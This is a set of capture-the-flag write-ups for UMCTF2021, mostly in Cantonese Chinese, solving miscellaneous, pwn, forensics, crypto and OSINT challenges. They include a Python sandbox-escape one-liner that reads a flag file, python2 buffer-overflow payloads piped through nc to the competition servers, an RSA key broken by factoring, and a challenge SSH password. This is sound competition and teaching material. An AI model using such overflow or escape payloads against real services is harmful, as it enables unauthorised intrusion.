# UMCTF Competition Noob's Hackathon 公開組
----
>**#Date: 2021-03-06 (10:00am- 5:00pm)**
>
>**CTF Competition**
>
----
----

# Miscellaneous - UMCTF2021 - Macow

- Write-Up Author: **Louis Lou**

- Flag: **MOCSCTF{1_4m_l1v1n6_1n_534c_p41_v4n_p4rk_n0w....}**


## **Question:**
>**Macow**</br>
>Author: **RB916120**

>do you remember macow??</br>
>flag in the file [http://bit.ly/2N8960t](http://bit.ly/2N8960t)


## **write-up:**

>首先 unzip file，然後利用 IDE Editor Search “**CTF**”，另一部分通過 Search "**}**" 找到。
> 
> 

----

# Miscellaneous - UMCTF2021 - snakeCage

- Write-Up Author: **Louis Lou**

- Flag: **MOCSCTF{ssssssnake_easy_peasy}**


## **Question:**
>**snakeCage**</br>
>Author: **RB916120**

>can you escape from snake cage?</br>
>nc 13.75.78.108 38001


## **write-up:**

>**Step 1：**
>import os; print(os.listdir('.'));</br>
>會見到fs有個叫flag的檔

>**Step 2：**
>再用 open('flag').read() 就會知道個flag</br>
>import os; print(open('flag').read());
> 
> 

----

# Miscellaneous - UMCTF2021 - takeit

- Write-Up Author: **Louis Lou**

- Flag: **MOCSCTF{55h_15_!_700_h4rd!!!!!!!!!!!!!!!}**


## **Question:**
>**takeit**</br>
>Author: **RB916120**

>i put the flag on the screen, take it if you can end the session</br>
>
>ssh eofffff@13.75.78.108 -p 38004 (password: DthBqhs8n)


## **write-up:**

>手機拍片逐格睇
> 
> 

----

# Miscellaneous - UMCTF2021 - Happy Check

- Write-Up Author: **Louis Lou**

- Flag: **MOCSCTF{VGhpc19pc19hbl9lc3p5X2NoZWNr}**


## **Question:**
>**Happy Check**</br>
>Author: **P0tato@天璇merak 20級**

>image with wrong spelling??? http://bit.ly/3r89I4B</br>
>


## **write-up:**

>直接拼圖找答
> 
> 

----

# Miscellaneous - UMCTF2021 - Mo talking to Res

- Write-Up Author: **Louis Lou**

- Flag: **MOCSCTF{d1d4hdid1d4hdid4hd1}**


## **Question:**
>**Mo talking to Res**</br>
>Author: **P0tato@天璇merak 20級**

>Mo:"Dah-di-dit di-dah-dah-dah-dah dah-di-dit di-di-di-di-dah di-di-di-dit dah-di-dit di-dit dah-di-dit di-dah-dah-dah-dah dah-di-dit di-di-di-di-dah di-di-di-dit dah-di-dit di-dit dah-di-dit di-di-di-di-dah di-di-di-dit dah-di-dit di-dah-dah-dah-dah"
>
>Res:"hey. that is fun.."
>
>please submit the flag with below format: **MOCSCTF{flag}**
>


## **write-up:**

>https://cryptii.com/
>
>**Text in :**</br>
>-.. .---- -.. ....- .... -.. .. -.. .---- -.. ....- .... -.. .. -.. ....- .... -.. .----
>
>**DECODE :**</br>
>Morse code
>
>**Text out :**</br>
>d1d4hdid1d4hdid4hd1
>
>

----

# PWN - UMCTF2021 - babycoffee-1

- Write-Up Author: **Louis Lou**

- Flag: **MOCSCTF{d0n7_l37_7h3m_pu7_700_much_c0ff33_w1ll_0v3rfl0w3d!!}**


## **Question:**
>**babycoffee-1**</br>
>Author: **RB916120**

>can you overflow the coffee?</br>
>
>nc 52.175.52.175 39001


## **write-up:**

>python2 -c "print 'A' * 100 + '\x44'" |  nc 52.175.52.175 39001
> 
>

----

# PWN - UMCTF2021 - babycoffee-2

- Write-Up Author: **Louis Lou**

- Flag: **MOCSCTF{d0_y0u_3nj0y_7h15_c7f_3v3n7?}**


## **Question:**
>**babycoffee-2**</br>
>Author: **RB916120**

>i would like to order a coffee..</br>
>
>nc 52.175.52.175 39002


## **write-up:**
>留意到 latte.c 中有 floor == 0xcafebabe
>
>if (floor == 0xcafebabe)</br>
>    {</br>
>        puts("Thanks for your latte! You deserve for the flag!");</br>
>        system("cat flag.txt");</br>
>    }</br>
>    
>只要令到 latte 執行時 overflow 後就可以行 system("cat flag.txt"); 睇flag!
>
>python2 -c "print 'A' * 32 + '\xBE\xBA\xFE\xCA'" | nc 52.175.52.175 39002
> 
>

----

# Forensic - UMCTF2021 - hide

- Write-Up Author: **Louis Lou**

- Flag: **mocsctf{c@n_y0u_f1nd_0ur_53cr3t?!}**


## **Question:**
>**hide**</br>
>Author: **TeruLei**

>hi,hi,hide in a pic~</br>


## **File(s):**
Forensic/388_hide.zip


## **write-up:**

>**Step 1.**
>unzip hide.zip and goto onlinehexeditor search “ctf” find first part.</br>
>
>**Step 2.**
>use https://stylesuxx.github.io/steganography/ find another part.</br>
>
> 

----

# Crypto - UMCTF2021 - caesars army

- Write-Up Author: **Louis Lou**

- Flag: **MOCSCTF{y0u_c4n_d3cryp7_f4573r_4nd_f4573r~~}**


## **Question:**
>**caesars army**</br>
>Author: **RB916120**

>some caesars around me, please decrypt them and get the flag.</br>
>
>nc 13.75.78.108 37002</br>
>


## **write-up:**

>Cryptii : use Caesar cipher (Encode)
>https://cryptii.com/pipes/binary-to-base64
>改變shift並留意出現 “msg is : ”, 完成回答 20 次 全對後就出 Flag
>
> 

----

# Crypto - UMCTF2021 - Vigenere

- Write-Up Author: **Louis Lou**

- Flag: **MOCSCTF{mocsctfissomuchfun}**


## **Question:**
>**Vigenere**</br>
>Author: **Bon**

>I don't think this question can beats you, am I right? ;) (please use the formal flag format. MOCSCTF{**Decrypt Key**})</br>
>
>Fvg xkkxb owzx-xqjzgrzhgv fxxkjadfcqu tz n bcnqceupstsfce jnjuqf ysu ud Twgb Nuvanmgm Ontgkyq sfr gmgk f grfon ukimmj vwee vv xqvfqj tgmbmwf qujjlw uybvctgmx. Idtsdnkz xsffso gped aoahobgk ffctodwvl fnlwf eyxlwuy ictvu, tsl kowfwjlx qrds kffbhilwr ns yynnvzu vzg ejblwf az voj wbdfgkrhslafu mfrofvrf wp ljx hqhzsdngey. Fnfst, Bqafvfwg Flkamyzuiu, ap ana ogfw Jqsdaemdjacx , nvnwbfyf amy gmpwdc kjkls, o olkanwnx qqerhsmfl cr njl Actqbgjg vnxzwf. Fbg Awcgtsoawl hqhzsd, bqdjprd, dtgxbimv s ddiiyjmfujg, jcmmmj jwscf hsx cdsfaemfjdw gkmvlr zbd gyavvmqfy pqnyljh pudjwt tqxzspqnu. Wqynes wkg mmm cwm mm voj zymu.
>
>

## **write-up:**

>goto https://www.guballa.de/vigenere-solver</br>
>貼上上面的文章</br>
>
>“Break Cipher” 後 爆出可讀文章</br>
>
>找 Clear text using key “mocsctfissomuchfun” 就是flag!</br>
>
>
 
----

# Crypto - UMCTF2021 - BabyRSA

- Write-Up Author: **Louis Lou**

- Flag: **mocsctf{d0nt_u5e_exp05ed_m0du1u5_1n_y0ur_R5@_keyp@1r}**


## **Question:**
>**BabyRSA**</br>
>Author: **Bon**

>4096 bit RSA seems very secure, isn't it?</br>
>
>


## **write-up:**

>goto factored.com ( http://factordb.com/ ) </br>
>
>利用 n 找出 p, q</br>
>
>代入 RSA python 程式解之</br>
>
> import libnum
> 
>c = 269844405061794408881325419068561434485918688756051876642746375053141507717597929239825337577579209690816428513931525234036734301387574498261290078881044479415744014820256909105714495529730629663658937178159412731786389961698282168259920902233310707944063223479503448187557768961081851712485146366548760263966245778212016948978527798277704632093115069928072483024285945733444356730940369756065506406633833767904027043643430662336549748635722383646959378992875277740185048950670626105822924157897674315671293920327582374631250965788561361655881854955542053089903302229673705337653184163330865800003873020538616404245132158526695981794705668869949289304505930692263324309476091304524253205836627565978339970916413587242299449345741887246431160569558890339312469194580183192572697658795725506098343583961185323328585347462691697809168365959166845470549054286300104327087547588837152920745317074385583980574691863675380358400449205876594680258453351033464040969208972777013806493485998564483884597732352399514265770300017498599635859458768753030321735697937089458748104376271070036461140010690454117843525729200228018391681972735344212666250731100957752185781052102382617863235173016936453322118156390709789254433748018918655915860480150
>
>n = 281754313027982971570879474662042826052269799836950108289447787842217309485873216170776543468437168393350059200374362048981393433408881751369675803401229529655591084313476729924536023798772942490845864632884558567806132947363571349245150996216546345353340601671652688781344469368923029232320443391712225927521174179310898457005171192252890336524040454393071420171001181669140744589369171113478834868447900274410402132006661797033023361625690585447254798985165455744432275919292724198974090214105824837144880040631351521070340939216278913520005428320267311654197182676073436783764335870542975580539375137464826694689395573688712102100327194220612546700117948236334721444601092067269470622713168767570735541431206834890570848919742565734097583813028357199534677333683859217018166356853645304731383491606491858119138158378100554093754768845592676342341803897099479236884329120232566270850944951303196269898405000739730547623825158643505824142841323525887814827498902713573606696532729007593646304581800997027460843118934771245523865132710880722892671173451612926980785812882505311966257573551037759677758065938483989331728112437528586270715206172687526753974972525302876127920142263956120389641089431443994482525450309962409286220210379
>
>**p = 16785538806603229546831014867806945109174660684369252526571837177530020871776186503540363533465363436174429883763287316563818908234704635026805208486158808815204607414064752499457590165922796827640257996628461578646367976289553053679994614392008975330957576095066582897319511781376559616923510156908689506249476205882440567232723613726676265000210162626070990882901701638639329709168419553908493633695967170810506043830544025025868627495339109609570196487756662527058313568351636167996254403290525990940877945979650689490916970989273615045213903412532460018605565074702280990810882484707265130962429078075196987306823**
>
>**q = 16785538806603229546831014867806945109174660684369252526571837177530020871776186503540363533465363436174429883763287316563818908234704635026805208486158808815204607414064752499457590165922796827640257996628461578646367976289553053679994614392008975330957576095066582897319511781376559616923510156908689506249476205882440567232723613726676265000210162626070990882901701638639329709168419553908493633695967170810506043830544025025868627495339109609570196487756662527058313568351636167996254403290525990940877945979650689490916970989273615045213903412532460018605565074702280990810882484707265130962429078075196987310173**
>
>E = 65537
>
>phi_N = (p-1) * (q-1)
>
>d = libnum.modular.invmod(E,phi_N)
>
>ans = pow(c,d,n)
>
>print(libnum.n2s(int(ans)))
>
>



----

# OSINT - UMCTF2021 - magic_swirl

- Write-Up Author: **Louis Lou**

- Flag: **MOCSCTF{7PJM6H23+25}**


## **Question:**
>**magic_swirl**</br>
>Author: **RB916120**

>find the plus code of this location!!
>
>please calculate the code with the swirl center position hints :
>
> https://github.com/MOCSCTF/CTF-Write-UP/tree/master/OSINT/SyskronSecurityCTF2020%20-%20Sightseeing%20again
>


## **write-up:**

>**Step 1.**</br>
>open google map 在松山 找到 迴旋形（the swirl center ）建築物，坐標是 （22.200094, 113.552920）plus code : 6H23+25 Macau
>
>**Step 2.**</br>
>利用 https://plus.codes/map 輸入6H23+25 Macau , 再點 下方的 ^ ，右邊顯示出正確碼： 7PJM6H23+25
>
>

